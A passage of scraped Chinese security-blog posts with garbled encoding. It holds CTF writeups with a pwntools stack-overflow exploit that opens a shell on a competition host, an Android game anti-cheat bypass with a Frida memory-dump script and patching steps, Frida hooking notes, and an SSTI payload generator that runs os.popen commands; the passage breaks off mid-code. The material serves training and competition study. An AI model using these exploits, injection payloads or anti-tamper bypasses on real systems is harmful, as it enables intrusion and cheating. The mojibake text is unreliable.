æŸæµ‹è¯•äººå‘˜åˆšåˆšå®Œæˆäº†ä¸€æ¬¾å›¾åƒåŠ å¯†ç®—æ³•çš„å¼€å‘ï¼Œæƒ³è¦é‚€è¯·ä½ è¿›è¡Œæ·±å…¥çš„åˆ†ææµ‹è¯•ã€‚\nå›¾å½¢å¾ˆæ‰­æ›²ï¼Œå¹¶ä¸”ä¼¼ä¹æœ‰è§„å¾‹å¯å¾ªã€‚æ ¹æ®å®ƒçš„å½¢çŠ¶ï¼Œæƒ³åˆ° Peano åˆ†å½¢æ›²çº¿\næœç´¢åˆ°ä¸€ç¯‡ IrisCTF2024 ä¸Šçš„é¢˜ç›®ï¼Œä¹Ÿæ˜¯ Peano åˆ†å½¢æ›²çº¿å¤„ç†è¿‡çš„å›¾ç‰‡çš„é¢˜ï¼Œå‚è€ƒåå¾—åˆ°å¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 from PIL import Image from tqdm import tqdm def peano(n): if n == 0: return [[0, 0]] else: in_lst = peano(n - 1) lst = in_lst.copy() px, py = lst[-1] lst.extend([px + i[0], py + 1 + i[1]] for i in in_lst) px, py = lst[-1] lst.extend([px + i[0], py + 1 + i[1]] for i in in_lst) px, py = lst[-1] lst.extend([px + 1 + i[0], py + i[1]] for i in in_lst) px, py = lst[-1] lst.extend([px - i[0], py - 1 - i[1]] for i in in_lst) px, py = lst[-1] lst.extend([px + i[0], py - 1 - i[1]] for i in in_lst) px, py = lst[-1] lst.extend([px + 1 + i[0], py + i[1]] for i in in_lst) px, py = lst[-1] lst.extend([px - i[0], py + 1 + i[1]] for i in in_lst) px, py = lst[-1] lst.extend([px + i[0], py + 1 + i[1]] for i in in_lst) return lst order = peano(6) img = Image.open(\u0026#34;r.png\u0026#34;) width, height = img.size block_width = width block_height = height new_image = Image.new(\u0026#34;RGB\u0026#34;, (width, height)) for i, (x, y) in tqdm(enumerate(order)): new_x, new_y = i % width, i // width pixel = img.getpixel((x, height - 1 - y)) new_image.putpixel((new_x, new_y), pixel) new_image.save(\u0026#34;rr.jpg\u0026#34;) å¤„ç†åï¼Œå¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œæ˜¯ä¸€ä¸ªäºŒç»´ç \næ‰«äº†å¾—åˆ° wdflag{dde235fa-114d-404c-8add-6007e6efabfd}\nPWN PWN02ï¼ˆBy ZZPengï¼‰ IDA é™æ€åˆ†æå¾—åˆ°ç”¨æˆ·åå¯†ç  admin, admin123\nvulnå‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´\nå‘ç°åé—¨å‡½æ•°gift, å­—ç¬¦ä¸²/bin/sh\nç¼–å†™åˆ©ç”¨è„šæœ¬ getshell\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 from pwn import * def exp(): context.log_level=\u0026#39;debug\u0026#39; context(arch=\u0026#39;i386\u0026#39;, os=\u0026#39;linux\u0026#39;) ELFpath = \u0026#39;./short\u0026#39; e = ELF(ELFpath) # p = process(ELFpath) p = remote(\u0026#39;0192d781680b7e11bd1fe073f5e5923d.el7z.dg10.ciihw.cn\u0026#39;, 46319) p.sendlineafter(\u0026#39;username: \u0026#39;, \u0026#39;admin\u0026#39;) p.sendlineafter(\u0026#39;password: \u0026#39;, \u0026#39;admin123\u0026#39;) buf = int(p.recvline_startswith(\u0026#39;You will input this: \u0026#39;).decode()[21:], 16) print (f\u0026#39;buf:{hex(buf)}\\n\u0026#39;) vuln = e.symbols[\u0026#39;vuln\u0026#39;] gift = e.symbols[\u0026#39;gift\u0026#39;] bin_sh = 0x0804A038 leave = 0x08048555 offset = 0x50 - 0x4*4 # gdb.attach(p) print (f\u0026#39;vuln:{hex(vuln)} gift:{hex(gift)}\u0026#39;) payload = b\u0026#39;aaaa\u0026#39;+p32(gift)+p32(0)+p32(bin_sh) p.sendafter(\u0026#39;plz input your msg:\u0026#39;, payload + cyclic(offset) +p32(buf) + p32(leave)) # p.sendafter(\u0026#39;plz input your msg:\u0026#39;, b\u0026#39;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae\u0026#39;) p.interactive() if __name__ == \u0026#39;__main__\u0026#39;: exp() wdflag{r6kghxuwgu60zb4q1rvp5943zak91ygf}\nReverse REVERSE01ï¼ˆBy Jeremiahï¼‰ IDA æ‰“å¼€å¯ä»¥çœ‹åˆ° flag è¢«åˆ†æˆäº† 4 éƒ¨åˆ†åŠ å¯†\nç¬¬ä¸€éƒ¨åˆ†æŠŠç”¨æˆ·è¾“å…¥çš„å‰ 8 å­—èŠ‚çš„ä¸¤å€èµ‹å€¼ç»™ s1\nç¬¬äºŒéƒ¨åˆ†æŠŠ input çš„ 8-16 å­—èŠ‚å’Œå­—ç¬¦ä¸² XorrLord å¼‚æˆ–ç¬¬ä¸‰éƒ¨åˆ†è¿›è¡Œ base64 ç¼–ç \nç¬¬å››éƒ¨åˆ†è¿›è¡Œ AES åŠ å¯†\nè§£å¯†è¿‡ç¨‹å¾ˆç®€å•ï¼Œå‰ä¸¤éƒ¨åˆ†æ‰‹é€†å³å¯\nè¿™é‡Œæ³¨æ„ä¸€ä¸‹æœ‰ä¸ªæ¢è¡¨æ“ä½œ\nAES å†™ä¸ªè„šæœ¬å³å¯\næœ€åæŠŠå››ä¸ªéƒ¨åˆ†æ‹¼èµ·æ¥å¾—åˆ° flag: wdflag{9e855bae8f9aaafe9a2eb2cbd8823519}\næœ¬ç¯‡æ–‡ç« ç”±é˜Ÿé•¿Luminoriaç¼–å†™\n","date":"2024-12-30T00:00:00Z","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202501011926019.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9Bwriteup%E6%9C%80%E5%A5%BD%E3%81%AE%E4%B8%80%E5%8F%89%E6%A0%91%E4%BD%BF%E7%94%A8%E8%80%85/","title":"ç¬¬å››å±Šç½‘é¼æ¯ç½‘ç»œå®‰å…¨å¤§èµ›é’é¾™ç»„åˆèµ›writeup(æœ€å¥½ã®ä¸€å‰æ ‘ä½¿ç”¨è€…)"},{"content":"gslab2021 åˆèµ› - å®‰å“å®¢æˆ·ç«¯å®‰å…¨ | Xhy\u0026rsquo;s Blogwpå‚è€ƒ\nAssembly CSharp.dllæ–‡ä»¶å·²åŠ å¯†ï¼Œè·¯å¾„ä¸ºX:\\GameSafety\\Game2021\\å®‰å“å®¢æˆ·ç«¯é¢˜ç›®\\åˆèµ›é¢˜ç›®\\RocketMouse\\assets\\bin\\Data\\Managed\nmonoå¼•æ“çš„unityæ¸¸æˆï¼ŒåŒ…åcom.personal.rocketmouse\nå¯åŠ¨æ¸¸æˆä¼šå¼¹çª—hacker detectå¹¶é€€å‡ºï¼Œåœ¨com.tencent.games.sec2021.Sec2021MsgBoxä¸‹æ‰¾åˆ°onDismissæ–¹æ³•è°ƒç”¨ç³»ç»Ÿå‡½æ•°exit\næŸ¥æ‰¾showçš„äº¤å‰å¼•ç”¨æ‰¾åˆ°com.tencent.games.sec2021.Sec2021IPCçš„onNativeEngineResponseæ–¹æ³•ï¼ŒçŒœæµ‹è°ƒç”¨äº†nativeå±‚çš„å‡½æ•°ä½¿è¿›ç¨‹é€€å‡ºï¼Œåœ¨idaä¸­æ‰¾killå‡½æ•°çš„äº¤å‰å¼•ç”¨æ‰¾åˆ°å‡½æ•°sub_1F788ï¼Œç»§ç»­æŸ¥æ‰¾å‡½æ•°è°ƒç”¨é“¾æ‰¾åˆ°1FAA8ï¼Œè¯¥å‡½æ•°è¢«è°ƒç”¨äº†5æ¬¡\nç”¨floridaè¿‡æ‰äº†æ£€æµ‹\næŸ¥çœ‹libmono.soå‘ç°libmono.soç»è¿‡äº†åŠ å¯†ï¼Œç”¨elf-dump-fixåœ¨libmono.soåŠ è½½ä¹‹åä»å†…å­˜ä¸­dumpå¹¶ä¿®å¤å¾—åˆ°è§£å¯†åçš„monodump.so\næ‰¾åˆ°libmono.soçš„mono_image_open_from_data_with_nameæ–¹æ³•ï¼Œæ­¤å¤„ç”¨äºåŠ è½½Assembly-CSharp.dllæ–‡ä»¶ï¼Œå‘ç°ç¬¬ä¸€æ¡æŒ‡ä»¤ç”¨äºè·³è½¬åˆ°libsec2021.soçš„sub_1CEDCå‡½æ•°ï¼Œæ­¤å‡½æ•°ç”¨äºå¯¹Assembly-CSharp.dllæ–‡ä»¶è§£å¯†\nä¼šå…ˆåˆ¤æ–­å¦‚æœæ˜¯MZå¼€å¤´å¹¶ä¸”è·¯å¾„ä¸­æ²¡æœ‰Assembly-CSsharp.dllæ–‡ä»¶ï¼Œå°±è·³è½¬åˆ°0x1CF88æ‰§è¡Œï¼Œå¦åˆ™å°±è°ƒç”¨0x1CF4Cè§£å¯†å‡½æ•°ï¼Œå¦‚å›¾ï¼Œæ­¤å¤„ä¼šå°†sec2021.pngçš„0x410Bè‡³æœ«å°¾çš„æ•°æ®è§£å¯†ï¼Œè§£å¯†ç»“æœä¸ºçœŸæ­£åŠ è½½çš„Assembly-CSharp.dll,æŸ¥çœ‹å‡½æ•°è°ƒç”¨å¯ä»¥çœ‹åˆ°è§£å¯†å‡½æ•°ä¸º0x1D2A0\nå…¶ä¸­sub_18CECä¸ºè·å–dllç´¢å¼•ï¼Œcrc32æ ¡éªŒå‡½æ•°ä¸ºsubF3B4æ­£å¸¸ä¼šè¿”å›0ï¼Œç›´æ¥æŠŠè¿”å›å€¼patchæˆ0å³å¯è¿‡æ£€æµ‹\nè¿‡å®Œæ£€æµ‹ä¹‹åå› ä¸ºmono_image_open_from_data_with_nameå‡½æ•°çš„ç¬¬ä¸€æ¡æŒ‡ä»¤ä¼šå®Œæˆè§£å¯†æ“ä½œï¼Œæ‰€ä»¥å¯ä»¥hookä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œå½“è¯»å–åˆ°çœŸæ­£çš„Assembly-CSharp.dllæ—¶åœ¨å†…å­˜ä¸­dumpå‡ºæ¥\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 function hook_mono() { var libbase = Module.findBaseAddress(\u0026#34;libmono.so\u0026#34;); console.log(\u0026#34;libbase\u0026#34;, libbase); var addr = Module.findExportByName(\u0026#34;libmono.so\u0026#34;, \u0026#34;mono_image_open_from_data_with_name\u0026#34;); console.log(\u0026#34;mono_image_open_from_data_with_name\u0026#34;, addr); Interceptor.attach(addr.add(4), { onEnter: function (args) { var data = args[0]; var data_len = args[1]; console.log(\u0026#34;data_length = \u0026#34;,data_len); console.log(\u0026#39;data = \u0026#39;,data); if (data_len == 0x2800) { WriteMemToFile(data,data_len.toInt32(),\u0026#39;dump.bin\u0026#39;); } console.log(\u0026#34;mono_image_open_from_data_with_name_ori() called!\u0026#34;, data, data_len); }, onLeave: function (retval) { } }); } function hook_dlopen(){ var dlopen = Module.findExportByName(null, \u0026#34;dlopen\u0026#34;); console.log(dlopen); if(dlopen != null){ Interceptor.attach(dlopen,{ onEnter: function(args){ var soName = args[0].readCString(); console.log(soName); this.is_mono_loaded = false; this.is_sec2021_loaded = false; if(soName.indexOf(\u0026#34;libsec2021.so\u0026#34;) !== -1){ //hook_initarray(); this.is_sec2021_loaded = true; } if(soName.indexOf(\u0026#34;libmono.so\u0026#34;) !== -1){ this.is_mono_loaded = true; } }, onLeave: function(retval){ if(this.is_mono_loaded){ //hook_getString(); hook_mono(); } } }); } var android_dlopen_ext = Module.findExportByName(null, \u0026#34;android_dlopen_ext\u0026#34;); console.log(android_dlopen_ext); if(android_dlopen_ext != null){ Interceptor.attach(android_dlopen_ext,{ onEnter: function(args){ var soName = args[0].readCString(); console.log(soName); this.is_mono_loaded = false; if(soName.indexOf(\u0026#34;libmono.so\u0026#34;) !== -1){ this.is_mono_loaded = true; } this.is_sec2021_loaded = soName.indexOf(\u0026#34;libsec2021.so\u0026#34;) !== -1; }, onLeave: function(retval){ if(this.is_mono_loaded){ //hook_getString(); hook_mono(); } } }); } } hook_dlopen(); function WriteMemToFile(addr, size, file_path) { Java.perform(function() { // let prefix: string = \u0026#39;/data/data/com.tencent.mf.uam/files/\u0026#39; # è·¯å¾„ let prefix = \u0026#39;/data/data/com.personal.rocketmouse/files/\u0026#39;; let mkdir = Module.findExportByName(\u0026#39;libc.so\u0026#39;, \u0026#39;mkdir\u0026#39;); let chmod = Module.findExportByName(\u0026#39;libc.so\u0026#39;, \u0026#39;chmod\u0026#39;); let fopen = Module.findExportByName(\u0026#39;libc.so\u0026#39;, \u0026#39;fopen\u0026#39;); let fwrite = Module.findExportByName(\u0026#39;libc.so\u0026#39;, \u0026#39;fwrite\u0026#39;); let fclose = Module.findExportByName(\u0026#39;libc.so\u0026#39;, \u0026#39;fclose\u0026#39;); let call_mkdir = new NativeFunction(mkdir, \u0026#39;int\u0026#39;, [\u0026#39;pointer\u0026#39;, \u0026#39;int\u0026#39;]); let call_chmod = new NativeFunction(chmod, \u0026#39;int\u0026#39;, [\u0026#39;pointer\u0026#39;, \u0026#39;int\u0026#39;]); let call_fopen = new NativeFunction(fopen, \u0026#39;pointer\u0026#39;, [\u0026#39;pointer\u0026#39;, \u0026#39;pointer\u0026#39;]); let call_fwrite = new NativeFunction(fwrite, \u0026#39;int\u0026#39;, [\u0026#39;pointer\u0026#39;, \u0026#39;int\u0026#39;, \u0026#39;int\u0026#39;, \u0026#39;pointer\u0026#39;]); let call_fclose = new NativeFunction(fclose, \u0026#39;int\u0026#39;, [\u0026#39;pointer\u0026#39;]); call_mkdir(Memory.allocUtf8String(prefix), 0x1FF); call_chmod(Memory.allocUtf8String(prefix), 0x1FF); let fp = call_fopen( Memory.allocUtf8String(prefix + file_path), Memory.allocUtf8String(\u0026#39;wb\u0026#39;)); if (call_fwrite(addr, 1, size, fp)) { console.log(\u0026#39;[+] Write file success, file path: \u0026#39; + prefix + file_path); } else { console.log(\u0026#39;[x] Write file failed\u0026#39;); } call_fclose(fp); }); } dumpå®Œæˆä¹‹ååˆ†ædllæ–‡ä»¶ï¼Œå› ä¸ºç›®æ ‡ä¸ºå®ç°æ— æ•Œï¼Œæ‰€ä»¥åªéœ€è¦ä¿®æ”¹æ¸¸æˆé€»è¾‘ä¸­å¯¹ç¢°æ’çš„æ£€æµ‹å³å¯ï¼Œå®šä½åˆ°MouseControllerç±»çš„OnTriggerEnter2Då‡½æ•°\nå¦‚æœä¸æ˜¯é‡‘å¸å°±ä¼šè°ƒç”¨HitByLaserå‡½æ•°ï¼Œæ‰€ä»¥åªè¦æŠŠç›¸åº”çš„Deadå±æ€§æ”¹ä¸ºfalseå³å¯ï¼Œåœ¨idaä¸­é™æ€patchï¼ŒåŸæ¥ä¸º4.1ï¼Œæ”¹ä¸º4.0å³å¯\næœ€ååªéœ€è¦æŠŠ0x1CF88å¤„çš„è·³è½¬æŒ‡ä»¤æ”¹æˆB ï¼Œä½¿éMZå¼€å¤´çš„dllæ‰æ‰§è¡Œè§£å¯†å‡½æ•°ï¼Œå¹¶æŠŠåŸæœ¬çš„dllæ›¿æ¢æˆç ´è§£ç‰ˆå³å¯\nå¤ç°ä¸­é‡åˆ°çš„é—®é¢˜ æ‰“å¼€APPå°±ä¼šé€€å‡ºå¹¶å¼¹çª—\u0026quot;hacker detect:xxx\u0026quot;ï¼Œåé¢å‘ç°æ˜¯appæ£€æµ‹äº†tmpç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨frida/idaç›¸å…³çš„ä¸œè¥¿ï¼Œæ›´æ”¹åç§°å³å¯è¿‡æ£€æµ‹\nä½¿ç”¨fridaå¯åŠ¨APPä»ç„¶ä¼šé€€å‡ºï¼Œæ˜¯å¯¹fridaçš„ä¸€äº›è¡Œä¸ºè¿›è¡Œæ£€æµ‹ã€‚ä½¿ç”¨floridaè¿‡äº†æ£€æµ‹\nå°è¯•hook libsec2021.soä¸­çš„sub_1F120(å­—ç¬¦ä¸²è§£å¯†å‡½æ•°)æ—¶,ä¼šå‡ºç°opcode crackçš„æƒ…å†µ,åŸå› æœªæŸ¥æ˜ï¼Œä½†æ˜¯é€šè¿‡patchæ‰é€€å‡ºå‡½æ•°çš„è°ƒç”¨ä¹Ÿèƒ½è¿‡ï¼Œç¼ºç‚¹æ˜¯åªèƒ½hookå‡ºéƒ¨åˆ†å­—ç¬¦ä¸²\nåœ¨dumpå†…å­˜çš„æ—¶å€™ï¼Œä¼šå‡ºç°dumpä¸å‡ºæ¥çš„æƒ…å†µï¼Œåé¢æ£€æŸ¥å‘ç°æ˜¯libmono.soæ˜¯åŠ¨æ€åŠ è½½çš„ï¼Œäºæ˜¯è¦å…ˆhook dlopenå‡½æ•°ï¼Œåœ¨libmono.soåŠ è½½ä¹‹åå†è¿›è¡Œhookï¼Œå¹¶æ‰§è¡Œå†…å­˜dump\ndump Assembly-CSharp.dllçš„æ—¶å€™ï¼Œæ˜¯æ ¹æ®dllçš„å¤§å°æ¥åˆ¤æ–­çš„ï¼Œç›®å‰ä¸æ¸…æ¥šå…·ä½“åŸå› æ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯åœ¨hook mono_image_open_from_data_with_nameå‡½æ•°çš„æ—¶å€™å‘ç°ä»–åŠ è½½çš„æ–‡ä»¶å¤§å°å·®å¼‚æ¯”è¾ƒå¤§ï¼Œç›®å‰çŒœæµ‹æ˜¯æ¯”è¾ƒæ‰€æœ‰è¢«åŠ è½½çš„dllçš„å¤§å°ä¹‹åæ‰åˆ¤æ–­è¦dumpå¤§å°ä¸º0x2800çš„dllæ–‡ä»¶\n","date":"2024-12-23T00:00:00Z","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202501011927719.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/gamesafety2021-android%E6%96%B9%E5%90%91%E5%88%9D%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/","title":"GameSafety2021 Androidæ–¹å‘åˆèµ›é¢˜ç›®å¤ç°"},{"content":"Fridaç›¸å…³api Javaå±‚ é™æ€æ–¹æ³•å’Œå®ä¾‹æ–¹æ³•çš„Hook 1 2 3 4 5 6 7 8 9 10 11 12 13 var money = Java.use(\u0026#34;com.Jeremiah.hook.money\u0026#34;); //ä¸éœ€è¦åŒºåˆ†ä¿®é¥°ç¬¦ï¼Œä¹Ÿä¸éœ€è¦åŒºåˆ†é™æ€å’Œå®ä¾‹æ–¹æ³•ï¼Œhookä»£ç çš„å†™æ³•éƒ½æ˜¯ä¸€æ ·çš„ //hookå®ä¾‹æ–¹æ³• money.getInfo.implementation = function () { var result = this.getInfo(); console.log(\u0026#34;result: \u0026#34;, result) return result; } //hooké™æ€æ–¹æ³• money.setFlag.implementation = function (a) { console.log(\u0026#34;param: \u0026#34;, a); return this.setFlag(a); } å‡½æ•°å‚æ•°å’Œè¿”å›å€¼çš„ä¿®æ”¹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 var money = Java.use(\u0026#34;com.Jeremiah.hook.Money\u0026#34;); var str = Java.use(\u0026#34;java.lang.String\u0026#34;); money.getInfo.implementation = function () { var result = this.getInfo(); console.log(\u0026#34;money.getInfo result: \u0026#34;, result); return str.$new(\u0026#34;Jeremiah\u0026#34;); //ä¸Šè¿°å­—ç¬¦ä¸²\u0026#34;Jeremiah\u0026#34;æ˜¯JSçš„stringï¼Œè€Œè¢«hookçš„Javaæ–¹æ³•è¿”å›å€¼æ˜¯Javaçš„String //å› æ­¤ï¼Œå¯ä»¥ä¸»åŠ¨è°ƒç”¨Javaæ–¹æ³•è½¬æˆJavaçš„String //ä½†æ˜¯ä¸ºäº†æ–¹ä¾¿èµ·è§ï¼Œé€šå¸¸ä¼šç›´æ¥ç›´æ¥è¿”å›JSçš„stringï¼Œè¿™æ—¶fridaä¼šè‡ªåŠ¨å¤„ç†ï¼Œä»£ç ç±»ä¼¼å¦‚ä¸‹ //return \u0026#34;Jeremiah\u0026#34;; //Javaçš„ç±»å‹å¯ä»¥è°ƒç”¨Javaçš„æ–¹æ³•ï¼ŒJSçš„ç±»å‹å¯ä»¥è°ƒç”¨JSçš„æ–¹æ³• //åŒºåˆ†æ¸…æ¥šä½•æ—¶æ˜¯Javaçš„ç±»å‹ï¼Œä½•æ—¶æ˜¯JSçš„ç±»å‹ï¼Œæœ‰åŠ©äºä»£ç çš„ç¼–å†™ //fridaåœ¨å‚æ•°ä¼ é€’çš„å¤„ç†ä¸Šä¹Ÿç±»ä¼¼ } money.setFlag.implementation = function (a) { console.log(\u0026#34;money.setFlag param: \u0026#34;, a); return this.setFlag(\u0026#34;Jeremiah\u0026#34;); } æ„é€ æ–¹æ³•çš„Hook $init 1 2 3 4 5 var money = Java.use(\u0026#34;com.Jeremiah.hook.Money\u0026#34;); money.$init.implementation = function(a,b){ console.log(\u0026#34;money.$init param: \u0026#34;,a, b); return this.$init(\u0026#34;dollar\u0026#34;,200); } Stringç±»çš„æ„é€ å‡½æ•°è¦Hook StringFactoryç±»ä¸‹çš„æŸä¸€äº›æ–¹æ³•\nå¯¹è±¡å‚æ•°çš„æ„é€ ä¸ä¿®æ”¹ $new 1 2 3 4 5 6 7 8 9 10 11 12 13 var wallet = Java.use(\u0026#34;com.Jeremiah.hook.Wallet\u0026#34;); var money = Java.use(\u0026#34;com.Jeremiah.hook.Money\u0026#34;); wallet.deposit.implementation = function (a) { console.log(\u0026#34;wallet.deposit param: \u0026#34;, a.getInfo()); return this.deposit(money.$new(\u0026#34;dollar\u0026#34;, 200)); } var wallet = Java.use(\u0026#34;com.Jeremiah.hook.Wallet\u0026#34;); wallet.deposit.implementation = function (a) { a.setAmount(2000); console.log(\u0026#34;wallet.deposit param: \u0026#34;, a.getInfo()); return this.deposit(a); } HashMapçš„æ‰“å° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 var utils = Java.use(\u0026#34;com.Jeremiah.hook.Utils\u0026#34;); var stringBuilder = Java.use(\u0026#34;java.lang.StringBuilder\u0026#34;); utils.shufferMap.implementation = function (a) { var key = a.keySet(); //å¾—åˆ°æ‰€æœ‰çš„key var it = key.iterator(); var result = stringBuilder.$new(); while(it.hasNext()){ var keystr = it.next(); var valuestr = a.get(keystr); result.append(valuestr); } console.log(\u0026#34;utils.shufferMap param: \u0026#34;, result.toString()); var result = this.shufferMap(a); console.log(\u0026#34;utils.shufferMap result: \u0026#34;, result); return result; } é‡è½½æ–¹æ³•çš„Hook 1 2 3 4 5 6 7 8 9 10 11 12 13 var utils = Java.use(\u0026#34;com.Jeremiah.hook.Utils\u0026#34;); utils.getCalc.overload(\u0026#39;int\u0026#39;, \u0026#39;int\u0026#39;).implementation = function (a, b) { console.log(\u0026#34;utils.getCalc param: \u0026#34;, a, b); return this.getCalc(a, b); } utils.getCalc.overload(\u0026#39;int\u0026#39;, \u0026#39;int\u0026#39;, \u0026#39;int\u0026#39;).implementation = function (a, b, c) { console.log(\u0026#34;utils.getCalc param: \u0026#34;, a, b, c); return this.getCalc(a, b, c); } utils.getCalc.overload(\u0026#39;int\u0026#39;, \u0026#39;int\u0026#39;, \u0026#39;int\u0026#39;, \u0026#39;int\u0026#39;).implementation = function (a, b, c, d) { console.log(\u0026#34;utils.getCalc param: \u0026#34;, a, b, c, d); return this.getCalc(a, b, c, d); } Hookæ–¹æ³•çš„æ‰€æœ‰é‡è½½ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 var utils = Java.use(\u0026#34;com.Jeremiah.hook.Utils\u0026#34;); var overloadsArr = utils.getCalc.overloads; //åŒ…å«è¯¥æ–¹æ³•çš„æ‰€æœ‰é‡è½½å‡½æ•°ï¼Œoverloadsè¿”å›é‡è½½å‡½æ•°çš„æ•°ç»„ for (var i = 0; i \u0026lt; overloadsArr.length; i++) { overloadsArr[i].implementation = function () { showStacks(); var params = \u0026#34;\u0026#34;; for (var j = 0; j \u0026lt; arguments.length; j++) { //argumentså­˜å‚¨æ‰€æœ‰ä¼ è¿›å‡½æ•°çš„å‚æ•° params += arguments[j] + \u0026#34; \u0026#34;; } console.log(\u0026#34;utils.getCalc is called! params is: \u0026#34;, params); // if(arguments.length == 2){ // return this.getCalc(arguments[0], arguments[1]); // }else if(arguments.length == 3){ // return this.getCalc(arguments[0], arguments[1], arguments[2]); // }else if(arguments.length == 4){ // return this.getCalc(arguments[0], arguments[1], arguments[2], arguments[3]); // } console.log(this); return this.getCalc.apply(this, arguments); //ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå½“å‰çš„Javaå¯¹è±¡å®ä¾‹ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„æˆ–ç±»æ•°ç»„å¯¹è±¡ï¼Œè¿™é‡ŒåŒ…å«äº†ä¼ è¿›å‡½æ•°çš„å‚æ•°ï¼Œæ­¤å¤„applyç”¨äºè°ƒç”¨åŸæ¥çš„getCalcæ–¹æ³• } } ","date":"2024-12-16T00:00:00Z","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202501012305417.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/frida%E5%B8%B8%E7%94%A8api%E8%AE%B0%E5%BD%95/","title":"Fridaå¸¸ç”¨APIè®°å½•"},{"content":"Write UPæœ€å¥½çš„ä¸€å‰æ ‘ä½¿ç”¨è€… WEB Safe_Proxy By Ron SSTIé¢˜ï¼Œè„šæœ¬ä¸€æŠŠæ¢­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 # æ¡ä»¶ï¼šå¯è®¾ç½® session # ç”¨åˆ°çš„å­—ç¬¦ {{}} [] () | select string lipsum session def payload1(): g = \u0026#34;(()|select|string)[1]\u0026#34; e = \u0026#34;(()|select|string)[2]\u0026#34; n = \u0026#34;(()|select|string)[3]\u0026#34; r = \u0026#34;(()|select|string)[5]\u0026#34; a = \u0026#34;(()|select|string)[6]\u0026#34; t = \u0026#34;(()|select|string)[7]\u0026#34; o = \u0026#34;(()|select|string)[8]\u0026#34; _global_ = \u0026#34;session[%s]\u0026#34;%g _builtins_ = \u0026#34;session[%s]\u0026#34; % e _import_ = \u0026#34;session[%s]\u0026#34; % n os = \u0026#34;session[%s]\u0026#34; % r popen = \u0026#34;session[%s]\u0026#34; % a cmd = \u0026#34;session[%s]\u0026#34;%t read = \u0026#34;session[%s]\u0026#34; % o session[\u0026#39;g\u0026#39;] = \u0026#34;__globals__\u0026#34; session[\u0026#39;e\u0026#39;] = \u0026#34;__builtins__\u0026#34; session[\u0026#39;n\u0026#39;] = \u0026#34;__import__\u0026#34; session[\u0026#39;r\u0026#39;] = \u0026#34;os\u0026#34; session[\u0026#39;a\u0026#39;] = \u0026#34;popen\u0026#34; session[\u0026#39;t\u0026#39;] = \u0026#34;whoami\u0026#34; session[\u0026#39;o\u0026#39;] = \u0026#34;read\u0026#34; # lipsum å’Œ url_for å¯äº’æ¢ s = \u0026#34;{{(lipsum[%s][%s][%s](%s)[%s](%s)|attr(%s))()}}\u0026#34;%(_global_,_builtins_,_import_,os,popen,cmd,read) print(s) def generate_number(num:int): num_map = { 0:\u0026#39;([]|length)\u0026#39;, 1:\u0026#39;([g]|length)\u0026#39;, 5:\u0026#39;(()|select|string|wordcount)\u0026#39;, 6:\u0026#39;(()|select|string|urlencode|wordcount)\u0026#39;, 12:\u0026#39;([g,g,g]|wordcount)\u0026#39;, 16:\u0026#39;([g,g,g,g]|wordcount)\u0026#39;, 20:\u0026#39;([g,g,g,g,g]|wordcount)\u0026#39;, 24:\u0026#39;([g,g,g,g,g,g]|wordcount)\u0026#39;, 28:\u0026#39;([g,g,g,g,g,g,g]|wordcount)\u0026#39;, 32:\u0026#39;([g,g,g,g,g,g,g,g]|wordcount)\u0026#39;, 36:\u0026#39;([g,g,g,g,g,g,g,g,g]|wordcount)\u0026#39;, 40:\u0026#39;([g,g,g,g,g,g,g,g,g,g]|wordcount)\u0026#39;, 44:\u0026#39;([g,g,g,g,g,g,g,g,g,g,g]|wordcount)\u0026#39;, 48:\u0026#39;([g,g,g,g,g,g,g,g,g,g,g,g]|wordcount)\u0026#39;, 106:\u0026#39;([config,config]|wordcount)\u0026#39;, } keys = 